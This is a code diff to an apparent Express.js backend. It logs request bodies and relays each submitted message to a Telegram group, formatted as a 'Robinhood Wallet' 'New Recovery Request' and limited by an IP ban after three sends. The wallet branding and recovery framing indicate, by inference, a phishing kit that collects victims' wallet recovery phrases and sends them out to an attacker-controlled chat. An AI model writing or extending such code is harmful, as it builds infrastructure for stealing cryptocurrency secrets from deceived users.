@@ -1,10 +1,23 @@
 require("dotenv").config();
+
 const express = require("express");
 const axios = require("axios");
+const cors = require("cors");
 const ipGuard = require("./ipGuard");
 
 const app = express();
+
+app.use(cors({
+    origin: "http://localhost:5173",
+    methods: ["GET", "POST", "OPTIONS"],
+    allowedHeaders: ["Content-Type"],
+}));
+
+// Handle preflight requests
+app.options("*", cors());
+
 app.use(express.json());
+
 app.use(ipGuard.banGuardMiddleware);
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -20,17 +33,40 @@ app.get("/health", (req, res) => {
     res.json({ status: "ok" });
 });
 
+app.use((req, res, next) => {
+    console.log(`${req.method} ${req.url}`);
+    console.log("Body:", req.body);
+    next();
+});
+
 app.post("/send", async (req, res) => {
     const { message } = req.body;
 
     if (!message || typeof message !== "string") {
-        return res.status(400).json({ error: "Field 'message' (string) is required" });
+        return res.status(400).json({
+            error: "Field 'message' (string) is required"
+        });
     }
+
+    const formattedMessage = `
+<b>🦊 Robinhood Wallet</b>
+
+━━━━━━━━━━━━━━
+
+<b>📩 New Recovery Request</b>
+
+<code>${message}</code>
+
+━━━━━━━━━━━━━━
+
+<b>🌐 Site:</b> Robinhood Wallet
+<b>🕒 Time:</b> ${new Date().toLocaleString()}
+`;
 
     try {
         const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: GROUP_CHAT_ID,
-            text: message,
+            text: formattedMessage,
             parse_mode: "HTML",
         });
 
@@ -39,13 +75,24 @@ app.post("/send", async (req, res) => {
         res.json({
             success: true,
             telegram_message_id: response.data.result.message_id,
-            ...(gotBanned && { warning: "This IP has now been banned after 3 consecutive sends." }),
+            ...(gotBanned && {
+                warning: "This IP has now been banned after 3 consecutive sends."
+            }),
         });
+
     } catch (err) {
-        console.error("Telegram send error:", err.response?.data || err.message);
-        res.status(500).json({ error: "Failed to send message to Telegram" });
+        console.error(
+            "Telegram send error:",
+            err.response?.data || err.message
+        );
+
+        res.status(500).json({
+            error: "Failed to send message to Telegram"
+        });
     }
 });
+
+
 
 app.post("/send-form", async (req, res) => {
     const { fields } = req.body;
